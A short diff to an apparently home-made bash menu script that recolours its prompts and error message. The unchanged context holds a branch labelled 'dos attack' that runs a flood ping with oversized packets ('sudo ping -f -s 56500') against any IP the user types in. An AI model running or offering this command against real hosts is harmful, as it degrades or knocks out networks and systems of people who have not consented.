@@ -35,7 +35,8 @@ do
 
 	#dos attack	
 	elif [ "$command" == "dos" ]; then
-		echo -n 'IP:'
+		echo ''
+		echo -n -e  "\e[1;34mIP:\e[0m"
 		read ip
         clear
 	    sudo ping -f -s 56500 $ip
@@ -49,7 +50,7 @@ do
 		echo ''
 	
 	else
-		echo 'error' #if nothing is found
+		echo -e  "\e[1;33mNot command or ip\e[0m" #if nothing is found
 	fi
 done
 #written by Armen Amirzadyan !!!Hostake!!!
